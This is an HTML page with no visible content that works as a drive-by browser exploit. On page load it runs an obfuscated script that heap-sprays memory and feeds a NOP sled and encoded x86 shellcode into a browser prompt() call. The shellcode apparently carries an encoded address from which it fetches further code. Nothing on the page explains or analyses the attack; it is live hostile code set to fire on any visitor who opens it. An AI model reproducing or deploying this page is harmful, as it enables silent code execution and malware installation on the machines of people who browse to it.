<!--hppage status="protected"-->
<HTML><HEAD><SCRIPT LANGUAGE="JavaScript"><!--
document.write(unescape("%3C%53%43%52%49%50%54%20%4C%41%4E%47%55%41%47%45%3D%22%4A%61%76%61%53%63%72%69%70%74%22%3E%3C%21%2D%2D%0D%0A%68%70%5F%6F%6B%3D%74%72%75%65%3B%66%75%6E%63%74%69%6F%6E%20%68%70%5F%64%30%30%28%73%29%7B%69%66%28%21%68%70%5F%6F%6B%29%72%65%74%75%72%6E%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%73%29%7D%2F%2F%2D%2D%3E%3C%2F%53%43%52%49%50%54%3E"));//--></SCRIPT><SCRIPT language="javascript">
function SpreadShellCode() {
var i = 0;
var eip = "";
var mem_block = "";
for (i=1 ; i <=500 ; i++)
{eip = eip + unescape("%u7030")+unescape("%u4300");}
var init_shellcode = "";
var main_shellcode = "";
var full_shellcode = "";
for (i=1 ; i<=200; i++)
{mem_block = mem_block + eip;}
init_shellcode=unescape("%u9090%u9090%u9090%u42ba%u4241%u8141%u11f2%u1111%u4111%u1139%ufb75%uf18b%uf88b%u3357%u66c9%u23b9%ufc01%ua4f3%uff5f%u90e7");
main_shellcode=unescape("%u5053%u5053%u3390%u33c0%uebc9%u5e12%ub966%u0101%ufe8b%u2e80%u8006%u0136%ue246%uebf7%ue805%uffe9%uffff%u5bf0%u7a90%u9043%u357b%u087f%u5dfa%u7d90%u0827%u38fa%u4ece%ub246%ue038%u143d%u1bc5%u3f2f%u7bf9%uc60f%u12d0%ue108%uf047%u40f4%u7ae4%u65ec%u6590%u082b%u6de2%u1390%u9050%u2365%ue208%u0b90%u0890%uc8ca%u595a%u5253%u5554%u4b35%u5353%u4807%u6341%u357c%u7f6a%u076a%uc738%u086b%u3747%u137f%u4790%u9013%u2377%u90b2%u0f47%u0ef0%u4790%u923b%u8347%u4790%u9a43%u95c4%u1555%ueff3%u048b%u0404%uf388%u880b%u2b33%u0443%u9ad7%uc457%u213d%u7734%u74ef%u0404%u9004%u2b5b%u9203%uc159%ue038%u5858%uf059%u582b%ud704%uc462%u059f%u1591%u58ef%u0404%u8804%u0bf3%u3388%u692b%ud704%u85c4%ue9df%uef78%u0447%u0404%u0459%uefd7%u04dc%u0404%u7b6f%u777b%u3441%u7134%u6c66%u7235%u7c6a%u3578%u7a79%u6834%u6e6c%u6932%u756e%u6e34%u376a%u373d%u3536%u6c68%u446e%u7f6a%u7377%u6e74%u427b%u5852%u3a37%u3732%u3b3a%u0007");
full_shellcode =  init_shellcode+main_shellcode;
mem_block = mem_block+full_shellcode;
prompt(mem_block,"Javascript initialized");
}
</SCRIPT></HEAD>
<BODY onload="setTimeout('SpreadShellCode()',2000)"><NOSCRIPT>To display this page you need a browser with JavaScript support.</NOSCRIPT></BODY></HTML>
